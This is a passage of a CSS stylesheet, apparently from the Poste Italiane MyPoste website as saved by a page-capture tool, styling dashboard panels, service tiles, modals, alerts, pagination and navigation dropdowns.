.panel-pills .pills-wrap .pills-abs-right {
    right: 0px;
}

.panel-pills .pills-wrap-accordion {
    padding-right: 30px;
}

.panel-pills-disabled .panel-heading,
.panel-pills-disabled .panel-heading .panel-title,
.panel-pills-disabled .panel-heading .panel-raise,
.panel-pills-disabled .panel-heading a,
.panel-pills-disabled .panel-heading a:focus,
.panel-pills-disabled .panel-heading a:hover{
   color: #d0d0d0!important;
}

/* Panel Dashboard */

.panel-group-dashboard .panel {
    -webkit-border-radius: 0px;
    -moz-border-radius: 0px;
    border-radius: 0px;
}

.panel-group-dashboard .panel + .panel {
    margin-top: 0;
}

.panel-dashboard {
    border-width: 1px 1px 0 1px;
    border-color: #ececec;
    border-style: solid;
    margin-bottom: 0;
    position: relative;
}

.panel-dashboard-bg {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/generiche/rounded-right-bg.png*/ url();
    background-position: top right;
    background-repeat: no-repeat;
}

.panel-dashboard .panel-heading {
    padding: 15px 20px;
}

.panel-dashboard .panel-body {
    padding: 20px;
    background-color: #f9f9f9;
}

.panel-dashboard .panel-body {
    border-top: 1px solid #ececec !important;
}

.panel-group-dashboard > .panel-dashboard:last-child {
    border-width: 1px;
}

.panel-dashboard .counter {
    vertical-align: middle;
    text-transform: uppercase;
    font-size: 13px;
    margin: -2px 0 0 0;
    display: inline-block;
    white-space: nowrap;
}

.panel-dashboard h5 {
    color: #787878;
    text-transform: uppercase;
    margin: 0 0 10px 0;
}

.panel-dashboard .dashboard-wrap {
    padding: 0px;
    background-repeat: no-repeat;
    background-position: 0px 50%;
    background-size: 40px;
    min-height: 40px;
    position: relative;
}

.panel-dashboard .dashboard-wrap .dashboard-abs {
    position: absolute;
    margin: 0;
    top: 50%;
    transform: translateY(-50%);
}

.panel-dashboard .dashboard-wrap .dashboard-abs-left {
    left: 0px;
}

.panel-dashboard .dashboard-wrap .dashboard-abs-right {
    right: 0px;
}

.panel-dashboard .dashboard-wrap .dashboard-subcontent {
    display: table-cell;
    height: 72px;
    vertical-align: middle;
}

.panel-dashboard .dashboard-wrap .dashboard-subcontent-expand {
    display: block;
    height: auto;
    width: 100%;
}

.panel-dashboard .dashboard-wrap .dashboard-heading {
    border-left: 1px solid #ececec;
    padding-left: 20px;
}

.panel-dashboard .dashboard-wrap .dashboard-heading .h6 {
    color: #787878;
}

.dashboard-wrap.dashboard-info {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/ico-messages-info.png*/ url();
}

.dashboard-wrap.dashboard-warning {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/ico-messages-warning.png*/ url();
}

.dashboard-wrap.dashboard-error {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/ico-messages-error.png*/ url();
}

.dashboard-wrap.dashboard-success {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/ico-messages-success.png*/ url();
}

.dashboard-wrap.dashboard-success,
.dashboard-wrap.dashboard-error,
.dashboard-wrap.dashboard-warning,
.dashboard-wrap.dashboard-info {
    padding-left: 60px;
}

.panel-dashboard .dashboard-wrap-date-simple {
    padding-left: 60px;
}

.panel-dashboard .dashboard-wrap-radio,
.panel-dashboard .dashboard-wrap-checkbox {
    padding-left: 40px;
}

.panel-dashboard .dashboard-wrap-radio .radio label,
.panel-dashboard .dashboard-wrap-checkbox .checkbox label{
  padding-left: 0 !important;
  text-transform: uppercase;
  font-weight: 600;
  color: #222427;
}

.panel-dashboard .dashboard-wrap-date-complete {
    padding-left: 60px;
    padding-top: 10px;
    padding-bottom: 10px;
}

.panel-dashboard .dashboard-wrap-accordion,
.panel-dashboard .dashboard-wrap-link {
    padding-right: 30px;
}

.external-label-dashboard {
    padding: 0px 20px;
    margin-bottom: 10px;
}

.external-label-dashboard-date-simple {
    padding-left: 80px;
}

.external-label-dashboard-accordion {
    padding-right: 50px;
}

/* arrow */

.collapsed-arrow,
.default-arrow {
    display: inline-block;
    background-repeat: no-repeat;
    background-position: center;
    transition: all .5s ease;
}

.collapsed-arrow {
    background-size: 14px 9px;
    width: 14px;
    height: 9px;
}

.default-arrow {
    background-size: 9px 14px;
    height: 14px;
    width: 9px;
}

.collapsed-arrow-small {
    background-size: 12px 8px;
}

.default-arrow-right {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/generiche/ico-arrow-grey-right@2x.png*/ url();
}

.collapsed-arrow-closed,
.open.collapsed .collapsed-arrow {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/generiche/ico-arrow-grey-down@2x.png*/ url();
    -webkit-transform: rotate(0deg);
    -moz-transform: rotate(0deg);
    -o-transform: rotate(0deg);
    -ms-transform: rotate(0deg);
    transform: rotate(0deg);
}

.collapsed-arrow-open,
.open .collapsed-arrow {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/generiche/ico-arrow-grey-down@2x.png*/ url();
    -webkit-transform: rotate(180deg);
    -moz-transform: rotate(180deg);
    -o-transform: rotate(180deg);
    -ms-transform: rotate(180deg);
    transform: rotate(180deg);
}


/***************************/

/******* Myposte Servizi  *******/

/***************************/

.myservices-area {
    margin-bottom: 20px;
}

.myservices-area.myservices-area-small {
    margin-bottom: 5px;
}

.myservices-area .myservices {
    border-style: solid;
    border-color: #ececec #ececec #ececec #d9e4f5;
    border-width: 1px 1px 1px 7px;
    position: relative;
    background: #fff;
}

.myservices-area .myservices.myservices-yellow {
    border-color: #ececec #ececec #ececec #eedc00;
}

.myservices-area .myservices a {
    padding: 25px 30px 25px 18px;
    height: 100%;
    width: 100%;
    display: block;
    color: #222427;
    font-size: 16px;
    font-weight: 500 !important;
    text-transform: uppercase;
    background-image: url("/risorse_dt/condivise/immagini/generiche/ico-arrow-grey-right.png");
    background-repeat: no-repeat;
    background-position: center right;
    background-position: center right 15px;
    background-size: 9px 14px;
}

.myservices-area .myservices a:hover {
    text-decoration: none;
    border-color: #d9e4f5;
}

.myservices-area .myservices a span {
    display: table-cell;
    vertical-align: middle;
    height: 50px;
}

.myservices-area .myservices img {
    margin-right: 15px;
    float: left;
    width: 24px;
}

.myservices-area-small .myservices {
    background-color: transparent;
    border-color: transparent;
    border-width: 1px;
}

.myservices-area-small .myservices a {
    background-color: transparent;
    padding: 5px 10px;
    background-image: none!important;
}

.myservices-area-small .myservices a span {
    height: 40px;
}

.myservices-area-small .myservices a > span:first-child {
    vertical-align: top;
    padding-top: 7px;
}

.myservices-area-small .myservices.edit-mode {
    border-color: #d9e4f5;
}

.myservices-area .myservices.edit-mode {
    background-image: url(/risorse_dt/condivise/immagini/icone/ico-editmode.png);
    background-position: top 5px right 0;
    background-repeat: no-repeat;
}

.myservices-area-small .myservices.edit-mode {
    background-color: #d9e4f5;
    background-image: url(/risorse_dt/condivise/immagini/icone/ico-editmode-white.png);
    background-position: top 5px right 0;
    background-repeat: no-repeat;
}

.myservices-area .myservices-drag-area {
    border: 2px dashed #d0d0d0;
    background-color: #fff;
}

.myservices-area .myservices-drag-area span {
    display: block;
    color: #d0d0d0;
    text-align: center;
    text-transform: uppercase;
}

.myservices-area .myservices-drag-area {
    height: 102px;
}

.myservices-area .myservices-drag-area img {
    width: 20px;
}

.myservices-area-small .myservices-drag-area {
    height: 48px;
}

.myservices-area .myservices-drag-area span {
    line-height: 98px;
}

.myservices-area-small .myservices-drag-area span {
    line-height: 44px;
}

.edit-mode a,
.edit-mode a:hover,
.edit-mode a:focus {
    cursor: grab;
}

.edit-mode a:active {
    cursor: grabbing;
}


/***************************/

/******* accordion *******/

/***************************/

.panel-group-accordion .panel {
    border-bottom: 1px solid #ececec;
    -webkit-border-radius: 0px;
    -moz-border-radius: 0px;
    border-radius: 0px;
}

.panel-group-accordion .panel-heading .panel-title {
    text-transform: uppercase;
    font-weight: 500;
}

.panel-group-accordion .panel-heading .accordion-toggle {
    padding-right: 30px;
    display: block;
    line-height: 22px;
    position: relative;
}

.panel-group-accordion .panel-heading .accordion-toggle:hover {
    text-decoration: none;
}

.panel-group-accordion .panel-heading .accordion-toggle:after {
    /*
    font-family: 'Glyphicons Halflings';
    content: "\e114";
    content: "\e260";
      */
    content: "-";
    float: right;
    font-weight: 300;
    font-size: 30px;
    line-height: 12px;
    color: #4a4a4a;
    position: absolute;
    top: 2px;
    right: 0;
}

.panel-group-accordion .panel-heading .accordion-toggle.collapsed:after {
    /*
    content: "\e080";
    content: "\e259";
    */
    content: "+";
}

.panel-group .panel-heading + .panel-collapse > .panel-body,
.panel-group .panel-heading + .panel-collapse > .list-group {
    border-color: transparent;
}

.content-blocktab h4 a,
.content-blocktab h4 {
    font-size: 22px;
    font-weight: 600;
    text-transform: none;
}

.panel-group-accordion-blocktab .panel-heading {
    padding: 15px;
}

.panel-group-accordion-blocktab .panel-heading .panel-title {
    margin-bottom: 5px;
}

.panel-group-accordion-blocktab .panel-heading .intro {
    margin-top: 10px;
}

.panel-group-accordion-blocktab .panel + .panel {
    margin: 0;
}

.panel-group-accordion-blocktab .panel-body {
    padding-top: 0;
}

.panel-group-accordion-blocktab .panel-body p.description {
    padding-top: 0;
}


/***************************/

/******* Modal *******/

/***************************/

.modal-content {
    -webkit-border-radius: 0px;
    -moz-border-radius: 0px;
    border-radius: 0px;
    -webkit-box-shadow: none;
    -moz-box-shadow: none;
    box-shadow: none;
}

.modal-header {
    background-color: #eedc00;
}

.modal-footer {
    border: none;
}

.modal-extra {
    background-color: #ececec;
    padding: 30px 15px;
    color: #787878;
    font-size: 14px;
}

.modal-footer .btn + .btn {
    margin-bottom: 15px;
}

.modal-content .close {
    margin-top: 4px;
    color: #222427;
    opacity: 1;
    text-shadow: none;
    font-weight: normal;
}

.modal-content .close span.close-text {
    font-size: 16px;
    text-transform: uppercase;
}

.modal-content .close span.close-icon {
    font-size: 36px;
    font-weight: 100;
}

.modal-stretch {
    /*width: 420px;*/
    padding: 0 40px;
}

.modal-spinner .modal-dialog {
    margin-top: 20%;
}

.modal-spinner .modal-dialog .modal-content {
    background-color: transparent;
    border: none;
    box-shadow: none;
    outline: 0 none;
    text-align: center;
}

.modal-spinner .modal-dialog .modal-content h3 {
    color: #fff;
    padding-bottom: 20px;
}

.modal-spinner .modal-dialog .modal-content img {
    width: 75px;
}

.modal-basic .modal-header {
    background-color: #fff;
    border: none;
}

.modal-basic .modal-title {
    color: #222427;
    padding: 30px 0 0 0;
}

.modal-basic .modal-content .close {
    margin-top: -6px;
}

.modal-flat .modal-content {
    min-height: 150px;
}

.modal-flat .modal-header {
    background-color: transparent;
    border: none;
}

.modal-flat .modal-title {
    font-size: 36px;
    font-weight: 500;
    margin: 20px 0 15px;
    line-height: initial;
    color: #222427;
}

.modal-flat .close {
    position: absolute;
    top: 5px;
    right: 30px;
    z-index: 1;
}

.modal iframe {
    height: 450px;
    width: 100%;
}

.modal video {
    height: auto;
    width: 100%;
}

.modal-fullpage video,
.modal-fullpage iframe {
    position: fixed;
    width: 90%;
    display: block;
    top: 5%;
    left: 5%;
    right: 5%;
}

.modal-fullpage video {
    height: 90%;
    background-color: #000;
}

.modal-fullpage iframe {
    height: 90%;
}

.modal-fullpage button.close {
    position: absolute;
    top: 50px;
    right: 3%;
    font-size: 33px;
    opacity: 1;
    color: #fafafa;
    font-weight: lighter;
}

.modal-backdrop {
    z-index: 1042;
    /*z-index: 1043;*/
    /*da testare*/
}

.modal-backdrop.backdrop-menu {
    z-index: 1040;
}

.thumb-video {
    position: relative;
    display: inline-block;
    width: 100%;
}

.thumb-video:after {
    content: " ";
    display: block;
    width: 60px;
    height: 60px;
    position: absolute;
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/ico-play.png*/ url();
    background-position: center;
    background-size: contain;
    top: 0;
    left: 0;
    bottom: 0;
    right: 0;
    margin: auto;
}


/***************************/

/******* notify *******/

/***************************/

.content-federation-bar .notified {
    content: '';
    display: inline-block;
    width: 10px;
    height: 10px;
    -moz-border-radius: 15px;
    -webkit-border-radius: 15px;
    border-radius: 15px;
    background-color: #ff3636;
    text-indent: -9999px;
    position: absolute;
    top: 6px;
    left: 10px;
}

.content-federation-bar-minified .header-minified .notified {
    content: '';
    display: inline-block;
    width: 10px;
    height: 10px;
    -moz-border-radius: 15px;
    -webkit-border-radius: 15px;
    border-radius: 15px;
    background-color: #ff3636;
    text-indent: -9999px;
    position: absolute;
    top: 12px;
    left: 10px;
}

.alert-container {
    position: fixed;
    right: 25px;
    width: 600px;
    z-index: 5;
}

.alert-container-top {
    top: 70px;
}

.alert-container-bottom {
    bottom: 10px;
}

.alert-container .alert {
    border-width: 1px;
}

.alert-container-top .alert {
    border-bottom-width: 10px;
    border-style: solid;
}

.alert-container-bottom .alert {
    border-top-width: 10px;
    border-style: solid;
}

.alert {
    -webkit-border-radius: 0px;
    -moz-border-radius: 0px;
    -ms-border-radius: 0px;
    border-radius: 0px;
    background-color: #fff;
    color: inherit;
    padding: 30px 40px;
}

.alert .toast-heading .area-heading {
    border-bottom: 1px solid #ececec;
}

.alert .toast-body .btn {
    margin-bottom: 0;
}

.alert h3,
.alert h4,
.alert h5 {
    padding-bottom: 10px;
}

.alert-success {
    border-color: #7BB741;
}

.alert-danger {
    border-color: #cc0000;
}

.alert-info {
    border-color: #0047bb;
}

.alert-warning {
    border-color: #F89A15;
}

.notify-dot {
    position: relative;
}

.btn-expand.notify-dot {
    overflow: initial;
}

.notify-dot:after {
    content: " ";
    display: block;
    position: absolute;
    top: -3px;
    right: 0px;
    background-color: #787878;
    height: 10px;
    width: 10px;
    -webkit-border-radius: 10px;
    -moz-border-radius: 10px;
    border-radius: 10px;
}

.btn.notify-dot:after {
    top: -4px;
    right: 8px;
}

.btn-xs.notify-dot:after {
    top: -3px;
    right: 0px;
}

.btn-cta.notify-dot:after {
    top: -2px;
    right: 5px;
}

.notify-dot-error:after {
    background-color: #ff3636;
}

.notify-dot-warning:after {
    background-color: #ffb906;
}

.notify-dot-info:after {
    background-color: #ececec;
}

.notify-dot-success:after {
    background-color: #26b158;
}

.notify-dot-basic:after {
    background-color: #0047bb;
}

.notify-dot-light:after {
    background-color: #787878;
}

.notify-dot-dark:after {
    background-color: #222427;
}


/***************************/

/******* Paginazione *******/

/***************************/

.pagination,
.pagination > li:first-child > a,
.pagination > li:first-child > span,
.pagination > li:last-child > a,
.pagination > li:last-child > span {
    -webkit-border-radius: 0px;
    -moz-border-radius: 0px;
    border-radius: 0px;
}

.pagination > .active > a,
.pagination > .active > span,
.pagination > .active > a:hover,
.pagination > .active > span:hover,
.pagination > .active > a:focus,
.pagination > .active > span:focus {
    background-color: #0047bb;
}


/***************************/

/******* Barra Federata e SubMenu *******/

/***************************/

.content-federation-bar {
    background-color: transparent;
    font-size: 14px;
    font-weight: 500;
    background-color: #f6f6f6;
    z-index: 1043;
    position: relative;
    /*border-bottom: 4px solid #eedc00;*/
}

.content-federation-bar .federation-bar-wrap-left {
    float: left;
    margin-right: 15px;
}

.content-federation-bar .federation-bar-wrap-right {
    float: right;
    /*margin-left: 15px;*/
}

.content-federation-bar .federation-bar-wrap {
    -webkit-border-radius: 0px;
    -moz-border-radius: 0px;
    border-radius: 0px;
    border: none;
    margin-bottom: 0px;
    min-height: 40px;
    position: relative;
}

.content-federation-bar .federation-bar-wrap ul {
    margin: 0;
}

.content-federation-bar .federation-bar-wrap ul.list-inline > li {
    padding: 0;
}

.content-federation-bar .federation-bar-wrap ul.dropdown-menu-federation,
.content-header ul.dropdown-menu-federation {
    right: 0;
    left: auto;
    font-size: 15px;
    padding: 10px 0;
    text-transform: uppercase;
    -webkit-border-radius: 0px;
    -moz-border-radius: 0px;
    -ms-border-radius: 0px;
    border-radius: 0px;
    border: none;
    top: 48px;
}

.content-federation-bar .federation-bar-wrap ul.dropdown-menu-federation:before,
.content-header ul.dropdown-menu-federation:before {
    content: '';
    display: block;
    height: 18px;
    width: 18px;
    background: #fff;
    transition: width .5s ease, background-color .5s ease;
    margin: 20px 0 0;
    position: absolute;
    /*top: -28px;*/
    top: -29px;
    transform: rotate(45deg);
    -ms-transform: rotate(45deg);
    -moz-transform: rotate(45deg);
    -webkit-transform: rotate(45deg);
    -o-transform: rotate(45deg);
    right: 20%;
    box-shadow: -4px -2px 4px rgba(0, 0, 0, 0.09);
}

.content-federation-bar .federation-bar-wrap .dropdown-windowbox-target ul.dropdown-menu-federation li a,
.content-federation-bar .federation-bar-wrap .dropdown-windowbox-business ul.dropdown-menu-federation li a,
.content-header .dropdown-windowbox-target ul.dropdown-menu-federation li a {
    padding: 6px 50px 6px 30px;
}

.content-federation-bar .federation-bar-wrap ul.dropdown-menu-federation li.dropdown-title,
.content-header ul.dropdown-menu-federation li.dropdown-title {
    padding: 6px 30px;
    margin-top: 6px;
    color: #787878;
    line-height: 1.2;
}

.content-federation-bar .federation-bar-wrap ul.dropdown-menu-federation li.dropdown-off-element,
.content-header ul.dropdown-menu-federation li.dropdown-off-element {
    background-color: #f6f6f6;
}

.content-federation-bar .federation-bar-wrap ul.dropdown-menu-federation li.dropdown-link img,
.content-header ul.dropdown-menu-federation li.dropdown-link img {
    width: 24px;
}

.content-federation-bar .federation-bar-wrap ul.dropdown-menu-federation li.dropdown-off-element a,
.content-header ul.dropdown-menu-federation li.dropdown-off-element a {
    color: #787878;
}

.content-federation-bar .federation-bar-wrap ul.dropdown-menu-federation li.dropdown-on-element,
.content-header ul.dropdown-menu-federation li.dropdown-on-element {
    background-color: #ececec;
    margin-top: 10px;
}

.content-federation-bar .federation-bar-wrap ul.dropdown-menu-federation li.dropdown-on-element a,
.content-header ul.dropdown-menu-federation li.dropdown-on-element a {
    color: #0047bb;
    text-transform: none;
    line-height: 46px;
    font-weight: bold;
}

.content-federation-bar .federation-bar-wrap ul.dropdown-menu-federation li.dropdown-spaced-element,
.content-header ul.dropdown-menu-federation li.dropdown-spaced-element {
    padding: 6px 30px 6px 30px;
}

.content-federation-bar .federation-bar-wrap ul.dropdown-menu-federation li.dropdown-spaced-element h6,
.content-header ul.dropdown-menu-federation li.dropdown-spaced-element h6 {
    margin: 20px 0 0;
}

.content-federation-bar .federation-bar-wrap ul.dropdown-menu-federation li.dropdown-standard-element a,
.content-header ul.dropdown-menu-federation li.dropdown-standard-element a {
    text-transform: none;
    white-space: normal;
    font-size: 16px;
    color: #0047bb;
}

.content-federation-bar .federation-bar-wrap ul.dropdown-menu-federation li #dropdown-federation-search,
.content-header ul.dropdown-menu-federation li #dropdown-federation-search {
    min-width: 220px;
}

.content-federation-bar .federation-bar-wrap ul.dropdown-menu-federation li a:hover,
.content-header ul.dropdown-menu-federation li a:hover {
    color: #0047bb;
}

.content-federation-bar .federation-bar-wrap ul.dropdown-menu-federation li.dropdown-on-element a:hover,
.content-header ul.dropdown-menu-federation li.dropdown-on-element a:hover {
    background-color: #ececec;
}

.content-federation-bar .federation-bar-wrap a.pi-targetarea,
.content-header a.pi-targetarea {
    padding: 0 15px;
    color: #222427;
    text-transform: uppercase;
    display: table-cell;
    height: 36px;
    vertical-align: middle;
}

.content-federation-bar .federation-bar-wrap a.pi-targetarea-active {
    color: #0047bb;
}

.content-federation-bar .federation-bar-wrap-left li:first-child a.pi-targetarea {
    padding-left: 0px;
}

.content-federation-bar .federation-bar-wrap-right li:last-child a.pi-targetarea {
    padding-right: 0px;
}

.content-federation-bar .federation-bar-wrap a:hover,
.content-federation-bar .federation-bar-wrap a:focus {
    color: #0047bb;
}

.content-federation-bar .federation-bar-wrap a.dropdown-toggle,
.content-header a.dropdown-toggle {
    background-position: center left;
    background-repeat: no-repeat;
    background-size: 18px;
}

.content-federation-bar .federation-bar-wrap a.dropdown-toggle-login,
.content-federation-bar .federation-bar-wrap a.dropdown-toggle-assistenza,
.content-header a.dropdown-toggle-login,
.content-header a.dropdown-toggle-assistenza {
    padding-left: 25px;
}

.content-federation-bar .federation-bar-wrap a.dropdown-toggle-assistenza,
.content-header a.dropdown-toggle-assistenza {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on/ico-assistenza-domande-frequenti.png*/ url();
}

.content-federation-bar .federation-bar-wrap a.dropdown-toggle-login,
.content-header a.dropdown-toggle-login {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on/ico-area-personale.png*/ url();
}

.content-federation-bar .federation-bar-wrap ul li.dropdown-windowbox-login,
.content-header ul li.dropdown-windowbox-login {}

.content-federation-bar .federation-bar-wrap ul li.dropdown-windowbox-login ul,
.content-header ul li.dropdown-windowbox-login ul {
    content: none;
    min-width: 236px;
    /* da grafica e' 212px, metto piu' largo perche' nella progettazione non hanno previsto la presenza di label ricorda */
    padding: 26px;
}

.content-federation-bar .federation-bar-wrap ul li.dropdown-windowbox-login .segments,
.content-header ul li.dropdown-windowbox-login .segments {
    margin-bottom: 30px;
    text-transform: none;
}

.content-federation-bar .federation-bar-wrap ul li.dropdown-windowbox-login .segments,
.content-federation-bar .federation-bar-wrap ul li.dropdown-windowbox-login .segments a,
.content-header ul li.dropdown-windowbox-login .segments,
.content-header ul li.dropdown-windowbox-login .segments a {
    padding: 0;
}

.content-federation-bar .federation-bar-wrap ul li.dropdown-windowbox-login ul label,
.content-header ul li.dropdown-windowbox-login ul label {
    font-size: 16px;
}

.content-federation-bar .federation-bar-wrap ul li.dropdown-windowbox-login ul .checkbox label,
.content-header ul li.dropdown-windowbox-login ul .checkbox label {
    text-transform: none;
}

.content-federation-bar .federation-bar-wrap ul li.dropdown-windowbox-login ul .form-group input.form-control,
.content-header ul li.dropdown-windowbox-login ul .form-group input.form-control {
    padding-left: 0;
    padding-right: 0;
}

.content-federation-bar .federation-bar-wrap ul li.dropdown-windowbox-login .btn-container-center .btn,
.content-header ul li.dropdown-windowbox-login .btn-container-center .btn {
    margin-left: 0;
}

.content-federation-bar .federation-bar-wrap ul li.dropdown-windowbox-login .subtext a,
.content-header ul li.dropdown-windowbox-login .subtext a {
    margin-left: 0;
    text-transform: none;
    padding-left: 0;
}

.submenu-product .submenu-product-inner {
    padding: 2px 0 0 0;
    /*overflow-x: auto;*/
}

.submenu-product ul {
    margin: 5px 0;
    /*display: table-row;*/
}

.submenu-product ul li {
    padding: 10px 15px;
    line-height: 22px;
    /*display: table-cell;
    vertical-align: middle;*/
}

#submenu-product-main-item {
    margin: 0 -15px;
    z-index: 1041;
    position: relative;
    background-color: #fff;
}

.submenu-product #submenu-product-main-item .dropdown-toggle-wrap .dropdown-menu li ul li a {
    text-transform: none;
    font-size: 1rem;
}

.submenu-product #submenu-product-main-item .dropdown-toggle-wrap {
    display: table-cell;
    height: 34px;
    vertical-align: middle;
}

.submenu-product #submenu-product-main-item .dropdown-toggle-wrap .dropdown-menu {
    -webkit-border-radius: 0px;
    -moz-border-radius: 0px;
    -ms-border-radius: 0px;
    border-radius: 0px;
    border: none;
    border-bottom: 1px solid #ececec;
    -webkit-box-shadow: none;
    -moz-box-shadow: none;
    box-shadow: none;
    top: 90%;
}

.submenu-product #submenu-product-main-item .dropdown-toggle-wrap .dropdown-menu:before {
    background: #fff none repeat scroll 0 0;
    -webkit-box-shadow: -4px -2px 4px rgba(0, 0, 0, 0.09);
    -moz-box-shadow: -4px -2px 4px rgba(0, 0, 0, 0.09);
    box-shadow: -4px -2px 4px rgba(0, 0, 0, 0.09);
    content: "";
    height: 18px;
    margin: 20px 0 0;
    position: absolute;
    right: 22%;
    top: -29px;
    transform: rotate(45deg);
    transition: width 0.5s ease 0s, background-color 0.5s ease 0s;
    width: 18px;
    /**/
    display: none;
}

.submenu-product #submenu-product-main-item .dropdown-toggle-wrap .dropdown-menu li {
    padding: 0;
    position: relative;
    z-index: 3;
}

.submenu-product #submenu-product-main-item .dropdown-toggle-wrap .dropdown-menu li:hover {
    color: #0047bb;
    background-color: #f5f5f5;
}

.submenu-product #submenu-product-main-item .dropdown-toggle-wrap .dropdown-menu li a {
    padding: 8px 35px;
    display: block;
}

.submenu-product #submenu-product-main-item > li:first-child {
    padding: 10px 0 0 0;
}

.submenu-product #submenu-product-main-item > li:last-child {
    /*padding-right: 0;*/
}

.submenu-product #submenu-product-main-item > li:first-child a {
    font-size: 15px;
    text-transform: uppercase;
    color: #222427;
    font-weight: bold;
    line-height: 22px;
}

.submenu-product #submenu-product-main-item > li:first-child ul li a {
    text-transform: uppercase;
    color: #222427;
    font-weight: normal;
    line-height: 18px;
}

.submenu-product #submenu-product-main-item > li a {
    line-height: 1.42857;
}

.submenu-product #submenu-product-main-item > li a:focus,
.submenu-product #submenu-product-main-item > li a:hover {
    background-color: transparent;
}

.submenu-product #submenu-product-main-item > li.active a {
    /*color: #222427;*/
}

.submenu-product #submenu-product-main-item .dropdown-toggle {
    padding-right: 24px;
    background-color: transparent;
    /*
    background-repeat: no-repeat;
    background-position: center right 15px;
    background-image: url(/risorse_dt/condivise/immagini/generiche/ico-arrow-grey-down-small.png);
    */
    display: block;
    width: 100%;
}

.submenu-product #submenu-product-main-item .dropdown-toggle .collapsed-arrow {
    position: absolute;
    right: 30px;
    top: 35%;
}

.submenu-product .submenu-product-scroller-wrap,
.submenu-need .submenu-need-scroller-wrap {
    padding: 0 30px;
}

.submenu-product .submenu-product-scroller,
.submenu-need .submenu-need-scroller {
    position: relative;
    height: 60px;
}

.submenu-product .submenu-product-scroller img,
.submenu-need .submenu-need-scroller img {
    width: 32px;
}

.submenu-product .submenu-product-scroller .slick-slide a,
.submenu-need .submenu-need-scroller .slick-slide a {
    height: 60px;
}

.submenu-product .submenu-product-scroller .slick-slide,
.submenu-need .submenu-need-scroller .slick-slide {
    vertical-align: middle;
    outline: none;
    margin-right: 35px;
}

.submenu-product .submenu-product-scroller .slick-slide a,
.submenu-need .submenu-need-scroller .slick-slide a {
    color: #787878;
    line-height: 20px;
    white-space: nowrap;
    font-size: 16px;
    font-weight: 600;
    display: table-cell;
    vertical-align: middle;
    border-bottom: 3px solid transparent;
    border-top: 3px solid transparent;
}

.submenu-product .submenu-product-scroller .slick-slide a:hover,
.submenu-need .submenu-need-scroller .slick-slide a:hover {
    color: #0047bb;
    text-decoration: none;
}

.submenu-product .submenu-product-scroller .slick-slide.active-element,
.submenu-need .submenu-need-scroller .slick-slide.active-element {
    color: #0047bb;
}

.submenu-product .submenu-product-scroller .slick-slide.active-element a,
.submenu-need .submenu-need-scroller .slick-slide.active-element a {
    color: #0047bb;
    border-bottom-color: #0047bb;
}


/*
.submenu-product .submenu-product-scroller .owl-prev,
.submenu-product .submenu-product-scroller .owl-next,
.submenu-need .submenu-need-scroller .owl-prev,
.submenu-need .submenu-need-scroller .owl-next {
    position: absolute;
    top: 20px;
    background-color: transparent;
    background-repeat: no-repeat;
    background-position: center;
    border: none;
    display: block;
    height: 22px;
    width: 22px;
    font-size: 0;
}

.submenu-product .submenu-product-scroller .owl-prev,
.submenu-need .submenu-need-scroller .owl-prev {
    left: -35px;
    background-image: url(/risorse_dt/condivise/immagini/generiche/ico-arrow-grey-left.png);
}

.submenu-product .submenu-product-scroller .owl-next,
.submenu-need .submenu-need-scroller .owl-next {
    right: -35px;
    background-image: url(/risorse_dt/condivise/immagini/generiche/ico-arrow-grey-right.png);
}
*/

.submenu-need .submenu-need-scroller .scroller-need-item a {
    background-position: left 1px center;
    background-repeat: no-repeat;
    background-size: 32px;
    padding-left: 46px;
}

.submenu-need .submenu-need-scroller .scroller-need-spedire a {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-bisogni-greydouble/ico-spedire.png*/ url();
}

.submenu-need .submenu-need-scroller .scroller-need-creare a {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-bisogni-greydouble/ico-creare-pensione.png*/ url();
}

.submenu-need .submenu-need-scroller .scroller-need-finanziare a {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-bisogni-greydouble/ico-finanziare-progetti.png*/ url();
}

.submenu-need .submenu-need-scroller .scroller-need-gestire a {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-bisogni-greydouble/ico-gestire-il-denaro.png*/ url();
}

.submenu-need .submenu-need-scroller .scroller-need-proteggere a {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-bisogni-greydouble/ico-proteggerti-dagli-imprevisti.png*/ url();
}

.submenu-need .submenu-need-scroller .scroller-need-risparmiare a {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-bisogni-greydouble/ico-risparmio-postale-risparmiare-investire.png*/ url();
}

.submenu-need .submenu-need-scroller .scroller-need-spedire.active-element a,
.submenu-need .submenu-need-scroller .scroller-need-spedire:hover a {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-bisogni-bluedouble/ico-spedisci-online-spedisci.png*/ url();
}

.submenu-need .submenu-need-scroller .scroller-need-creare.active-element a,
.submenu-need .submenu-need-scroller .scroller-need-creare:hover a {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-bisogni-bluedouble/ico-creare-pensione.png*/ url();
}

.submenu-need .submenu-need-scroller .scroller-need-finanziare.active-element a,
.submenu-need .submenu-need-scroller .scroller-need-finanziare:hover a {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-bisogni-bluedouble/ico-finanziare-progetti.png*/ url();
}

.submenu-need .submenu-need-scroller .scroller-need-gestire.active-element a,
.submenu-need .submenu-need-scroller .scroller-need-gestire:hover a {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-bisogni-bluedouble/ico-gestire-il-denaro.png*/ url();
}

.submenu-need .submenu-need-scroller .scroller-need-proteggere.active-element a,
.submenu-need .submenu-need-scroller .scroller-need-proteggere:hover a {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-bisogni-bluedouble/ico-proteggerti-dagli-imprevisti.png*/ url();
}

.submenu-need .submenu-need-scroller .scroller-need-risparmiare.active-element a,
